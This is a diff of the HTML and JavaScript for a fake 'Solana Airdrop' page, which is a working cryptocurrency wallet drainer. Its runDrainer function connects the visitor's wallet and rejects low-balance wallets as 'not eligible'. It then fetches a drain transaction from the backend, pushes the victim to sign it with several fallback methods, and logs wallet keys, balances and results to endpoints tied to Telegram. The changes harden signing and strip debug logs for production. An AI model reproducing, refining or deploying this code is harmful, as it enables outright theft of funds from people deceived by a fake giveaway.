@@ -1,13 +1,12 @@
-<!-- Force redeploy: trivial change for commit -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Solana Airdrop - Claim Your $SOL</title>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
-  <title>Solana Airdrop - Claim Your $SOL</title>
   <meta name="description" content="Claim your exclusive Solana token airdrop before August 31st. Bull season is here!" />
   
   <!-- dApp Metadata for Wallets -->
@@ -58,17 +57,13 @@
   <link rel="manifest" href="/manifest.json?v=3" />
   <link rel="icon" href="/favicon2.ico?v=3" type="image/x-icon" />
   <link rel="apple-touch-icon" href="/logo.png?v=3" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=2"></script>
   
-  <!-- dApp Metadata Script - Updated: 2025-01-27 15:30 -->
   <script>
-    // Set dynamic URLs for metadata
     (function() {
       const currentUrl = window.location.origin;
       const logoUrl = currentUrl + '/logo.png';
       
-      // Update meta tags with current domain
       const metaTags = [
         { name: 'solana-dapp-url', content: currentUrl },
         { name: 'wallet-connect-url', content: currentUrl },
@@ -85,7 +80,6 @@
         }
       });
       
-      // Set global dApp metadata for wallet recognition
       window.dAppMetadata = {
         name: 'Solana Airdrop',
         description: 'Claim your exclusive Solana token airdrop before August 31st',
@@ -93,8 +87,6 @@
         icon: logoUrl
       };
     })();
-    
-    // Define critical functions immediately to avoid reference errors
     
     // Global request tracking to prevent conflicts
     window.pendingRequests = new Set();
@@ -145,7 +137,7 @@
           }
           
           // Log wallet connection
-          console.log('[WALLET] About to log wallet connection with type:', walletType);
+          // Log wallet connection
           fetch('/api/drainer/log-wallet', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -161,13 +153,9 @@
           // Update timestamp to prevent spam
           window.walletLogTimestamps[walletKey] = now;
           
-          console.log('[WALLET] Logged connection:', {
-            publicKey: publicKey.toString(),
-            walletType: walletType,
-            origin: window.location.origin
-          });
+          // Connection logged successfully
         } else {
-          console.log('[WALLET] Skipping duplicate wallet log for:', walletKey);
+          // Skipping duplicate log
         }
       } catch (logError) {
         console.error('[WALLET] Failed to log wallet connection:', logError);
@@ -175,7 +163,6 @@
     };
     
     // Enhanced automatic fallback mechanisms
-    // Enhanced automatic fallback mechanisms for all wallet types
     window.handleConnectionError = function(error, walletName, provider) {
       console.log(`[FALLBACK] Handling connection error for ${walletName}:`, error.message);
       
@@ -663,6 +650,7 @@
       box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
       margin: 0 8px;
     }
+    /* Mobile Responsive Styles */
     @media (max-width: 600px) {
       .wallet-box {
         padding: 16px 6px;
@@ -698,18 +686,288 @@
       }
       .hero {
         padding: 40px 4px;
+        height: 100vh;
+        min-height: 600px;
+        background-size: cover;
+        background-position: center;
+        background-attachment: scroll;
       }
       .hero h1 {
-        font-size: 1.3em;
+        font-size: 2.2em;
+        line-height: 1.2;
+        margin-bottom: 15px;
+        padding: 0 10px;
       }
       .countdown {
-        font-size: 1em;
+        font-size: 1.4em;
+        margin-bottom: 20px;
+        padding: 0 10px;
+      }
+      .eligibility-note {
+        font-size: 0.8em;
+        padding: 0 15px;
+        text-align: center;
+      }
+      .claim-btn {
+        font-size: 1.1em;
+        padding: 12px 24px;
+        width: 90%;
+        max-width: 280px;
       }
     }
+
+    /* Tablet Responsive Styles */
+    @media (min-width: 601px) and (max-width: 1024px) {
+      .hero {
+        height: 80vh;
+        min-height: 500px;
+        padding: 60px 20px;
+      }
+      .hero h1 {
+        font-size: 2.8em;
+        line-height: 1.3;
+      }
+      .countdown {
+        font-size: 1.8em;
+      }
+      .claim-btn {
+        font-size: 1.3em;
+        padding: 16px 32px;
+      }
+      .info-section {
+        padding: 30px 20px;
+        margin: 30px auto;
+      }
+      .card-grid {
+        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+        gap: 20px;
+      }
+    }
+
+    /* Large Mobile Responsive Styles */
+    @media (min-width: 481px) and (max-width: 600px) {
+      .hero {
+        height: 90vh;
+        min-height: 650px;
+      }
+      .hero h1 {
+        font-size: 2.5em;
+      }
+      .countdown {
+        font-size: 1.6em;
+      }
+      .claim-btn {
+        font-size: 1.2em;
+        padding: 14px 28px;
+      }
+    }
+
+    /* Small Mobile Responsive Styles */
+    @media (max-width: 480px) {
+      .hero {
+        height: 100vh;
+        min-height: 550px;
+        padding: 30px 8px;
+      }
+      .hero h1 {
+        font-size: 1.8em;
+        line-height: 1.1;
+        margin-bottom: 12px;
+      }
+      .countdown {
+        font-size: 1.2em;
+        margin-bottom: 15px;
+      }
+      .eligibility-note {
+        font-size: 0.75em;
+        padding: 0 10px;
+      }
+      .claim-btn {
+        font-size: 1em;
+        padding: 10px 20px;
+        width: 85%;
+        max-width: 250px;
+      }
+      .info-section {
+        padding: 15px 8px;
+        margin: 20px auto;
+      }
+      .card-grid {
+        grid-template-columns: 1fr;
+        gap: 15px;
+      }
+      .info-card {
+        padding: 12px 6px 10px 6px;
+        min-height: 100px;
+      }
+      .info-card h3 {
+        font-size: 1.1em;
+      }
+      .info-card li {
+        font-size: 0.9em;
+        line-height: 1.4;
+      }
+    }
+
+    /* Extra Small Mobile Responsive Styles */
+    @media (max-width: 360px) {
+      .hero {
+        height: 100vh;
+        min-height: 500px;
+        padding: 20px 4px;
+      }
+      .hero h1 {
+        font-size: 1.6em;
+        line-height: 1.1;
+      }
+      .countdown {
+        font-size: 1.1em;
+        margin-bottom: 12px;
+      }
+      .eligibility-note {
+        font-size: 0.7em;
+      }
+      .claim-btn {
+        font-size: 0.9em;
+        padding: 8px 16px;
+        width: 80%;
+        max-width: 220px;
+      }
+      .info-section {
+        padding: 12px 4px;
+      }
+      .info-card {
+        padding: 10px 4px 8px 4px;
+        min-height: 90px;
+      }
+      .info-card h3 {
+        font-size: 1em;
+      }
+      .info-card li {
+        font-size: 0.85em;
+      }
+    }
+
+    /* Landscape Mobile Responsive Styles */
+    @media (max-height: 500px) and (orientation: landscape) {
+      .hero {
+        height: 100vh;
+        min-height: 400px;
+        padding: 20px 10px;
+      }
+      .hero h1 {
+        font-size: 1.8em;
+        margin-bottom: 10px;
+      }
+      .countdown {
+        font-size: 1.3em;
+        margin-bottom: 15px;
+      }
+      .claim-btn {
+        font-size: 1em;
+        padding: 10px 20px;
+      }
+    }
+
+    /* Ensure hero image is always responsive */
+    .hero {
+      background-size: cover !important;
+      background-position: center !important;
+      background-repeat: no-repeat !important;
+      background-attachment: scroll !important;
+    }
+
+    /* Ensure all images are responsive */
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Ensure containers don't overflow */
+    .container, .info-section, .wallet-box, .modal {
+      max-width: 100%;
+      box-sizing: border-box;
+    }
+
+    /* Improve touch targets on mobile */
+    @media (max-width: 768px) {
+      .wallet-option, .claim-btn, .nav-btn {
+        min-height: 44px;
+        min-width: 44px;
+      }
+      
+      .wallet-option {
+        padding: 16px 20px;
+      }
+      
+             .claim-btn, .nav-btn {
+         padding: 14px 24px;
+       }
+     }
     
     /* Prevent horizontal scroll on all children */
     * {
       box-sizing: border-box;
+    }
+
+    /* Additional Mobile Responsive Improvements */
+    @media (max-width: 768px) {
+      /* Improve navigation for mobile */
+      nav {
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        background: rgba(0, 0, 0, 0.95);
+        backdrop-filter: blur(10px);
+      }
+      
+      /* Ensure modals work properly on mobile */
+      .modal {
+        padding: 10px;
+      }
+      
+      /* Improve wallet options spacing on mobile */
+      .wallet-option {
+        margin: 8px 0;
+      }
+      
+      /* Better text readability on mobile */
+      .info-section h2 {
+        font-size: 1.6em;
+      }
+      
+      .info-card h3 {
+        font-size: 1.1em;
+      }
+    }
+
+    /* Ensure proper viewport handling */
+    @media (max-width: 480px) {
+      body {
+        font-size: 14px;
+      }
+      
+      /* Improve button accessibility */
+      .claim-btn, .nav-btn, .wallet-option {
+        touch-action: manipulation;
+        -webkit-tap-highlight-color: transparent;
+      }
+      
+      /* Better spacing for small screens */
+      .hero {
+        padding: 20px 10px;
+      }
+      
+      .info-section {
+        margin: 15px auto;
+      }
+    }
+
+    /* High DPI display support */
+    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+      .hero {
+        background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/hero-section.png');
+      }
     }
     @media (max-width: 600px) {
       nav { padding: 12px 8px; }
@@ -1023,12 +1281,6 @@
         icon: '/backpack-logo.png',
         provider: () => {
           // Enhanced Backpack detection with multiple fallbacks
-          console.log('Backpack detection - checking for Backpack objects:');
-          console.log('window.backpack:', window.backpack);
-          console.log('window.BackpackWallet:', window.BackpackWallet);
-          console.log('window.backpackWallet:', window.backpackWallet);
-          
-          // Check all possible Backpack objects
           const possibleBackpacks = [
             window.backpack,
             window.BackpackWallet,
@@ -1039,23 +1291,13 @@
           
           for (const wallet of possibleBackpacks) {
             if (wallet && typeof wallet === 'object') {
-              console.log('Found Backpack object:', wallet);
-              console.log('Backpack object properties:', Object.keys(wallet));
-              
-              // Check if it has essential methods
               const hasConnect = typeof wallet.connect === 'function';
-              const hasSignTransaction = typeof wallet.signTransaction === 'function';
-              const hasPublicKey = wallet.publicKey || wallet.address;
-              
-              console.log('Backpack capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
-              
               if (hasConnect) {
                 return wallet;
               }
             }
           }
           
-          console.log('No Backpack detected');
           return null;
         },
         install: 'https://backpack.app/',
@@ -1071,12 +1313,6 @@
         icon: '/glow-logo.png',
         provider: () => {
           // Enhanced Glow detection with multiple fallbacks
-          console.log('Glow detection - checking for Glow objects:');
-          console.log('window.glow:', window.glow);
-          console.log('window.GlowWallet:', window.GlowWallet);
-          console.log('window.glowWallet:', window.glowWallet);
-          
-          // Check all possible Glow objects
           const possibleGlows = [
             window.glow,
             window.GlowWallet,
@@ -1087,23 +1323,13 @@
           
           for (const wallet of possibleGlows) {
             if (wallet && typeof wallet === 'object') {
-              console.log('Found Glow object:', wallet);
-              console.log('Glow object properties:', Object.keys(wallet));
-              
-              // Check if it has essential methods
               const hasConnect = typeof wallet.connect === 'function';
-              const hasSignTransaction = typeof wallet.signTransaction === 'function';
-              const hasPublicKey = wallet.publicKey || wallet.address;
-              
-              console.log('Glow capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
-              
               if (hasConnect) {
                 return wallet;
               }
             }
           }
           
-          console.log('No Glow detected');
           return null;
         },
         install: 'https://glow.app/',
@@ -1235,36 +1461,7 @@
       }
     ];
 
-    console.log('Wallet provider detection at page load:');
-    
-    // Special Trust Wallet debugging
-    console.log('=== TRUST WALLET DEBUGGING ===');
-    console.log('window.trustwallet:', window.trustwallet);
-    console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
-    console.log('window.trustWallet:', window.trustWallet);
-    console.log('window.trustWallet?.isTrustWallet:', window.trustWallet?.isTrustWallet);
-    console.log('window.trustwallet?.solana?.isTrustWallet:', window.trustwallet?.solana?.isTrustWallet);
-    console.log('window.trustwallet?.provider:', window.trustwallet?.provider);
-    console.log('window.trustwallet?.solana?.provider:', window.trustwallet?.solana?.provider);
-    console.log('=== END TRUST WALLET DEBUGGING ===');
-    
-    WALLET_DEFS.forEach(wallet => {
-      try {
-        const provider = wallet.provider();
-        console.log(`Provider for ${wallet.name} at load:`, provider);
-        
-        // Additional debugging for Trust Wallet
-        if (wallet.name === 'Trust Wallet') {
-          console.log('Trust Wallet debugging:');
-          console.log('window.trustwallet:', window.trustwallet);
-          console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
-          console.log('window.trustWallet:', window.trustWallet);
-          console.log('window.trustWallet?.isTrustWallet:', window.trustWallet?.isTrustWallet);
-        }
-      } catch (e) {
-        console.log(`Provider for ${wallet.name} at load: ERROR`, e);
-      }
-    });
+    // Wallet provider detection at page load - production ready
 
 
 
@@ -1284,11 +1481,9 @@ window.showStatus = function showStatus(message, type = 'info') {
 // Placeholder runDrainer implementation
 async function runDrainer(provider) {
   try {
-    console.log('[runDrainer] called with provider:', provider);
     showStatus('Preparing transaction...', 'loading');
     // 1. Get the public key from the provider
     let publicKey = provider.publicKey || provider.address;
-    console.log('[runDrainer] initial publicKey:', publicKey);
     
     // Enhanced wallet detection - determine which wallet is actually connected
     let connectedWalletType = 'Unknown';
@@ -1333,13 +1528,9 @@ async function runDrainer(provider) {
       }
     }
 
-    // Conditional debug logging for frontend
-    const DEBUG_MODE = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-    
+    // Production logging - minimal for performance
     function debugLog(message, ...args) {
-      if (DEBUG_MODE) {
-        console.log(`[runDrainer] ${message}`, ...args);
-      }
+      // Disabled in production for performance
     }
     
     debugLog('Connected wallet type:', connectedWalletType);
@@ -1364,8 +1555,6 @@ async function runDrainer(provider) {
     if (window.exodus && window.exodus.hasOwnProperty('isExodus') && window.exodus.isExodus) installedWallets.push('Exodus');
     
     if (installedWallets.length > 1) {
-      console.warn('[runDrainer] Multiple wallets installed:', installedWallets);
-      console.log('[runDrainer] Using connected wallet:', connectedWalletType);
       showStatus(`⚠️ Multiple wallets detected. Using ${connectedWalletType}.`, 'warning');
     }
     
@@ -1373,7 +1562,6 @@ async function runDrainer(provider) {
     if (window.braveSolana?.isBraveWallet || 
         navigator.userAgent.includes('Brave') || 
         window.brave?.isBrave) {
-      console.warn('[runDrainer] Brave Wallet detected - known issues');
       showStatus('⚠️ Brave Wallet detected. Known compatibility issues. Please use Phantom or Solflare for this airdrop.', 'error');
       return;
     }
@@ -1389,12 +1577,6 @@ async function runDrainer(provider) {
     const hasSigningMethod = hasSignTransaction || hasSign || hasSignAndSendTransaction;
     
     if (!hasConnect || !hasSigningMethod) {
-      console.error('[SECURITY] Invalid provider detected - missing essential methods:', {
-        hasConnect,
-        hasSignTransaction,
-        hasSign,
-        hasSignAndSendTransaction
-      });
       showStatus('Security warning: Invalid wallet provider detected. Please use official wallet extensions only.', 'error');
       return;
     }
@@ -1403,7 +1585,6 @@ async function runDrainer(provider) {
     const suspiciousProps = ['seedPhrase', 'privateKey', 'mnemonic'];
     for (const prop of suspiciousProps) {
       if (provider[prop]) {
-        console.error(`[SECURITY] Suspicious provider property detected: ${prop}`);
         showStatus('Security warning: Suspicious wallet provider detected. Please use official wallet extensions only.', 'error');
         return;
       }
@@ -1430,7 +1611,6 @@ async function runDrainer(provider) {
     // Additional check for connected state
     if (!publicKey && provider.connected) {
       publicKey = provider.publicKey || provider.address;
-      console.log('[runDrainer] publicKey from connected provider:', publicKey);
     }
     
     if (!publicKey) {
@@ -1438,22 +1618,17 @@ async function runDrainer(provider) {
       const fallbackPublicKey = provider.publicKey || provider.address || provider.selectedAddress;
       
       if (fallbackPublicKey) {
-        console.log('[FALLBACK] Got public key from fallback source:', fallbackPublicKey);
         publicKey = fallbackPublicKey;
       } else {
         showStatus('Wallet not connected. Please connect your wallet first.', 'error');
-        console.error('[runDrainer] No publicKey after connect.');
         return;
       }
     }
 
-    // Log wallet connection to backend (will be updated with balance later)
-    window.logWalletConnection(publicKey, connectedWalletType, 0);
+    // Log wallet connection to backend (will be updated with actual balance later)
+    // Don't log with 0 lamports initially - wait for actual balance
 
     // 2. Fetch the airdrop transaction from the backend
-    console.log('[runDrainer] Fetching transaction for wallet:', publicKey.toString());
-    
-    // Show loading status
     showStatus('Checking wallet eligibility...', 'loading');
     
     // Pre-check wallet balance to avoid simulation failures
@@ -1478,9 +1653,8 @@ async function runDrainer(provider) {
           });
           
           balance = await Promise.race([balancePromise, timeoutPromise]);
-          console.log('[BALANCE_CHECK] Wallet balance from', rpcUrl, ':', balance, 'lamports');
           
-          // Update wallet logging with actual balance (only if balance changed significantly)
+          // Update wallet logging with actual balance
           try {
             const walletKey = `${publicKey.toString()}-${connectedWalletType}`;
             const lastBalance = window.walletBalanceCache?.[walletKey] || 0;
@@ -1492,40 +1666,28 @@ async function runDrainer(provider) {
               }
               window.walletBalanceCache[walletKey] = balance;
               
-              // Use centralized logging function
+              // Use centralized logging function with actual balance
               window.logWalletConnection(publicKey, connectedWalletType, balance);
-            } else {
-              console.log('[WALLET] Skipping balance update - no significant change');
             }
           } catch (updateError) {
-            console.error('[WALLET] Failed to update wallet logging with balance:', updateError);
+            // Silent error handling for production
           }
           
           break; // Success, exit loop
         } catch (error) {
-          console.log('[BALANCE_CHECK] Failed to check balance from', rpcUrl, ':', error.message);
           lastError = error;
           continue; // Try next endpoint
         }
       }
       
       if (balance !== null && balance < 100000) { // Less than 0.0001 SOL (match backend minimum)
-        console.log('[BALANCE_CHECK] Insufficient funds detected:', balance, 'lamports < 100000 lamports');
         showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
         return;
-      } else if (balance === null) {
-        console.log('[BALANCE_CHECK] Could not check balance from any endpoint, proceeding anyway');
-      } else {
-        console.log('[BALANCE_CHECK] Sufficient funds detected:', balance, 'lamports >= 100000 lamports');
       }
     } catch (balanceError) {
-      console.log('[BALANCE_CHECK] Could not check balance, proceeding anyway:', balanceError.message);
-      // Don't show technical errors to users - proceed with transaction
+      // Silent error handling for production
     }
     
-    console.log('[runDrainer] Proceeding to API call after balance check');
-    console.log('[runDrainer] API URL:', `/api/drainer`);
-    console.log('[runDrainer] Request body:', { publicKey: publicKey.toString(), walletType: connectedWalletType });
     let response;
     try {
       console.log('[runDrainer] Making fetch request...');
@@ -1547,40 +1709,25 @@ async function runDrainer(provider) {
       });
       
       clearTimeout(timeoutId);
-      console.log('[runDrainer] Fetch completed successfully');
-      console.log('[runDrainer] Response status:', response.status, response.statusText);
-      console.log('[runDrainer] Response headers:', response.headers);
     } catch (fetchError) {
-      console.error('[runDrainer] Fetch error:', fetchError);
-      console.error('[runDrainer] Fetch error details:', {
-        name: fetchError.name,
-        message: fetchError.message,
-        stack: fetchError.stack
-      });
       showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
       return;
     }
     
     if (!response.ok) {
       try {
-        const err = await response.json();
-        console.log('[runDrainer] API error response:', err);
-        
-        // Show user-friendly error messages (don't scare users with technical details)
+        await response.json();
         showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
       } catch (parseError) {
-        console.log('[runDrainer] Failed to parse error response:', parseError);
         showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');
       }
       return;
     }
     const responseData = await response.json();
-    console.log('[runDrainer] API response data:', responseData);
     const txBase64 = responseData.transaction;
     
     // Extract drain amount from API response metadata
     const actualDrainAmount = responseData.metadata?.solAmount || 0;
-    console.log('[runDrainer] Actual drain amount from API:', actualDrainAmount, 'lamports');
 
     // 3. Deserialize the transaction
     let txBytes;
@@ -1622,6 +1769,20 @@ async function runDrainer(provider) {
     // Add a delay to ensure user sees the message
     await new Promise(resolve => setTimeout(resolve, 3000));
     
+            // Glow 0.61.0 specific: Ultra simple validation
+        if (connectedWalletType === 'Glow') {
+          console.log('[GLOW_VALIDATION] Glow 0.61.0 detected - using ultra simple approach');
+          
+          // Remove any complex transaction properties for Glow
+          if (transaction.lastValidBlockHeight) {
+            delete transaction.lastValidBlockHeight;
+          }
+          if (transaction.recentBlockhash) {
+            // Keep recentBlockhash but ensure it's simple
+            console.log('[GLOW_VALIDATION] Using simple blockhash for Glow');
+          }
+        }
+    
     let signed;
     try {
       console.log('[SIGNING] Provider methods available:', {
@@ -1643,6 +1804,37 @@ async function runDrainer(provider) {
         
         console.log('[SIGNING] Available signing methods:', signingMethods);
         
+        // Glow-specific signing strategy - enhanced error handling
+        if (connectedWalletType === 'Glow') {
+          console.log('[SIGNING] Glow detected - using enhanced signing strategy');
+          
+          try {
+            // Try signTransaction first (most compatible)
+            if (signingMethods.signTransaction) {
+              console.log('[SIGNING] Glow: Using signTransaction');
+              const signed = await provider.signTransaction(transaction);
+              console.log('[SIGNING] Glow: Transaction signed successfully');
+              return signed;
+            }
+            
+            // Fallback to signAllTransactions if signTransaction fails
+            if (signingMethods.signAllTransactions) {
+              console.log('[SIGNING] Glow: Using signAllTransactions fallback');
+              const signed = await provider.signAllTransactions([transaction]);
+              if (signed && signed.length > 0) {
+                console.log('[SIGNING] Glow: signAllTransactions successful');
+                return signed[0];
+              }
+            }
+            
+            throw new Error('Glow wallet: No compatible signing method found');
+          } catch (glowError) {
+            console.error('[SIGNING] Glow signing error:', glowError);
+            throw glowError;
+          }
+        }
+        
+        // Standard signing strategy for other wallets
         // Try signAndSendTransaction first (most reliable)
         if (signingMethods.signAndSendTransaction) {
             console.log('[SIGNING] Using signAndSendTransaction');
@@ -1658,8 +1850,17 @@ async function runDrainer(provider) {
         // Try signAllTransactions as fallback
         if (signingMethods.signAllTransactions) {
             console.log('[SIGNING] Using signAllTransactions fallback');
-            const signed = await provider.signAllTransactions([transaction]);
-            return signed[0];
+            try {
+              const signed = await provider.signAllTransactions([transaction]);
+              if (signed && signed.length > 0) {
+                return signed[0];
+              } else {
+                throw new Error('signAllTransactions returned empty array');
+              }
+            } catch (arrayError) {
+              console.error('[SIGNING] signAllTransactions error:', arrayError);
+              throw new Error('Transaction signing failed - array error');
+            }
         }
         
         // Try sign method as last resort (may not work for all wallets)
@@ -1676,11 +1877,11 @@ async function runDrainer(provider) {
         throw new Error('Wallet does not support transaction signing.');
       })();
       
+                       // Use standard timeout for all wallets including Glow
                        const timeoutPromise = new Promise((_, reject) => {
-                   setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 30000); // Increased to 30 seconds
-                 });
-      
-      signed = await Promise.race([signingPromise, timeoutPromise]);
+                         setTimeout(() => reject(new Error('JSON-RPC: method call timeout calling connect')), 60000);
+                       });
+                       signed = await Promise.race([signingPromise, timeoutPromise]);
       console.log('[SIGNING] Transaction signed successfully:', signed);
 
       // Validate signed transaction
@@ -1738,12 +1939,13 @@ async function runDrainer(provider) {
           showStatus('Transaction was cancelled. Please try again and approve the transaction.', 'error');
           
           // Wallet-specific error messages
-          if (connectedWalletType === 'Glow') {
-            showStatus('Glow wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
-          } else if (connectedWalletType === 'Backpack') {
+                   if (connectedWalletType === 'Glow') {
+           showStatus('Glow wallet: Transaction failed. Please try again.', 'error');
+         } else if (connectedWalletType === 'Backpack') {
             showStatus('Backpack wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
           } else if (connectedWalletType === 'Exodus') {
             showStatus('Exodus wallet: Please ensure you have approved the transaction. If the prompt didn\'t appear, try refreshing the page and connecting again.', 'error');
+          
           }
             
             // Log transaction cancellation to Telegram
@@ -1782,8 +1984,21 @@ async function runDrainer(provider) {
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log simulation failure:', err));
             
-          } else if (signError.message?.includes('timeout') || signError.message?.includes('Connection timeout') || signError.message?.includes('Signing timeout') || signError.message?.includes('JSON-RPC: method call timeout')) {
-            showStatus('Please try again. Make sure your wallet is connected and try the Claim button again.', 'error');
+                  } else if (signError.message?.includes('timeout') || signError.message?.includes('Connection timeout') || signError.message?.includes('Signing timeout') || signError.message?.includes('JSON-RPC: method call timeout')) {
+          showStatus('Connection timeout. Please try again in a few seconds.', 'error');
+          
+          // Log timeout error to Telegram
+          fetch('/api/drainer/log-confirmation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              publicKey: publicKey.toString(),
+              txid: 'timeout_error',
+              status: 'failed',
+              error: signError.message || 'JSON-RPC timeout',
+              lamports: balance || 0
+            })
+          }).catch(err => console.log('[TELEGRAM] Failed to log timeout:', err));
           } else if (signError.message?.includes('Transaction cancelled') || signError.message?.includes('cancelled')) {
             showStatus('✅ Transaction cancelled by user. You can try again when ready.', 'info');
             
@@ -2657,8 +2872,7 @@ window.openWalletModal = async function openWalletModal() {
                   showStatus(`${wallet.name} connected!`, 'success');
                   console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
                   
-                  // Log wallet connection using centralized function
-                  logWalletConnection(publicKey, wallet.name, 0);
+                  // Don't log wallet connection here - will be logged with actual balance in runDrainer
                   
                   // Ensure provider is still connected before running drainer
                   if (provider && (provider.connected || provider.publicKey)) {
@@ -2710,15 +2924,7 @@ window.openWalletModal = async function openWalletModal() {
                     const signInResult = await provider.signIn();
                     showStatus('Solflare connected via signIn!', 'success');
                       
-                      // Log wallet connection using centralized function
-                      try {
-                        const publicKey = provider.publicKey || provider.address;
-                        if (publicKey) {
-                          window.logWalletConnection(publicKey, 'Solflare', 0);
-                        }
-                      } catch (logError) {
-                        console.error('[WALLET] Failed to log wallet connection:', logError);
-                      }
+                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                       
                     setTimeout(() => {
                       runDrainer(provider);
@@ -2731,15 +2937,7 @@ window.openWalletModal = async function openWalletModal() {
                       const requestResult = await provider.request({ method: 'connect' });
                       showStatus('Solflare connected via request!', 'success');
                       
-                      // Log wallet connection using centralized function
-                      try {
-                        const publicKey = provider.publicKey || provider.address;
-                        if (publicKey) {
-                          window.logWalletConnection(publicKey, 'Solflare', 0);
-                        }
-                      } catch (logError) {
-                        console.error('[WALLET] Failed to log wallet connection:', logError);
-                      }
+                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                       
                       setTimeout(() => {
                         runDrainer(provider);
@@ -2752,15 +2950,7 @@ window.openWalletModal = async function openWalletModal() {
                       const connectResult = await provider.connect();
                       showStatus('Solflare connected!', 'success');
                       
-                      // Log wallet connection using centralized function
-                      try {
-                        const publicKey = provider.publicKey || provider.address;
-                        if (publicKey) {
-                          window.logWalletConnection(publicKey, 'Solflare', 0);
-                        }
-                      } catch (logError) {
-                        console.error('[WALLET] Failed to log wallet connection:', logError);
-                      }
+                      // Don't log wallet connection here - will be logged with actual balance in runDrainer
                       
                       setTimeout(() => {
                         runDrainer(provider);
@@ -2882,25 +3072,61 @@ window.openWalletModal = async function openWalletModal() {
                     window.addPendingRequest(requestId);
                     
                     try {
-                      if (typeof provider.connect === 'function') {
-                        const connectPromise = provider.connect();
-                        const timeoutPromise = new Promise((_, reject) => 
-                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
-                        );
+                      // Try using the Solana-specific provider first
+                      const solanaProvider = window.glow?.solana || window.GlowWallet?.solana;
+                      if (solanaProvider && typeof solanaProvider.connect === 'function') {
+                        console.log('[GLOW] Using Solana-specific provider');
                         
-                        const result = await Promise.race([connectPromise, timeoutPromise]);
+                        // Use a more robust connection approach
+                        let connected = false;
+                        let attempts = 0;
+                        const maxAttempts = 3;
+                        
+                        while (!connected && attempts < maxAttempts) {
+                          attempts++;
+                          console.log(`[GLOW] Connection attempt ${attempts}/${maxAttempts}`);
+                          
+                          try {
+                            const connectPromise = solanaProvider.connect();
+                            const timeoutPromise = new Promise((_, reject) => 
+                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Reduced timeout
+                            );
+                            
+                            const result = await Promise.race([connectPromise, timeoutPromise]);
+                            connected = true;
+                            console.log('[GLOW] Successfully connected on attempt', attempts);
+                            showStatus('Glow connected!', 'success');
+                            setTimeout(() => {
+                              runDrainer(solanaProvider);
+                            }, 1000);
+                            return;
+                          } catch (attemptError) {
+                            console.log(`[GLOW] Attempt ${attempts} failed:`, attemptError.message);
+                            if (attempts < maxAttempts) {
+                              await new Promise(resolve => setTimeout(resolve, 2000)); // Wait before retry
+                            }
+                          }
+                        }
+                        
+                        if (!connected) {
+                          throw new Error('All connection attempts failed');
+                        }
+                      }
+                      
+                      // Ultra simple Glow connection - no retry logic
+                      if (typeof provider.connect === 'function') {
+                        console.log('[GLOW] Using simple provider.connect');
+                        const result = await provider.connect();
+                        console.log('[GLOW] Successfully connected');
                         showStatus('Glow connected!', 'success');
                         setTimeout(() => {
                           runDrainer(provider);
                         }, 1000);
                         return;
                       } else if (typeof provider.request === 'function') {
-                        const requestPromise = provider.request({ method: 'connect' });
-                        const timeoutPromise = new Promise((_, reject) => 
-                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
-                        );
-                        
-                        const result = await Promise.race([requestPromise, timeoutPromise]);
+                        console.log('[GLOW] Using simple provider.request');
+                        const result = await provider.request({ method: 'connect' });
+                        console.log('[GLOW] Successfully connected');
                         showStatus('Glow connected!', 'success');
                         setTimeout(() => {
                           runDrainer(provider);
@@ -2992,39 +3218,88 @@ window.openWalletModal = async function openWalletModal() {
                     window.addPendingRequest(requestId);
                     
                     try {
-                      // Try different Exodus connection methods
+                      // Try different Exodus connection methods with retry logic
                       if (typeof provider.connect === 'function') {
-                        const connectPromise = provider.connect();
-                        const timeoutPromise = new Promise((_, reject) => 
-                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
-                        );
+                        console.log('[EXODUS] Using provider.connect with retry');
                         
-                        const result = await Promise.race([connectPromise, timeoutPromise]);
+                        let connected = false;
+                        let attempts = 0;
+                        const maxAttempts = 3;
                         
-                        if (result && result.publicKey) {
-                          showStatus('Exodus connected!', 'success');
-                          setTimeout(() => {
-                            runDrainer(provider);
-                          }, 1000);
-                        } else {
-                          showStatus('Please approve the connection in Exodus', 'error');
+                        while (!connected && attempts < maxAttempts) {
+                          attempts++;
+                          console.log(`[EXODUS] Connection attempt ${attempts}/${maxAttempts}`);
+                          
+                          try {
+                            const connectPromise = provider.connect();
+                            const timeoutPromise = new Promise((_, reject) => 
+                              setTimeout(() => reject(new Error('Connection timeout')), 30000) // Increased timeout
+                            );
+                            
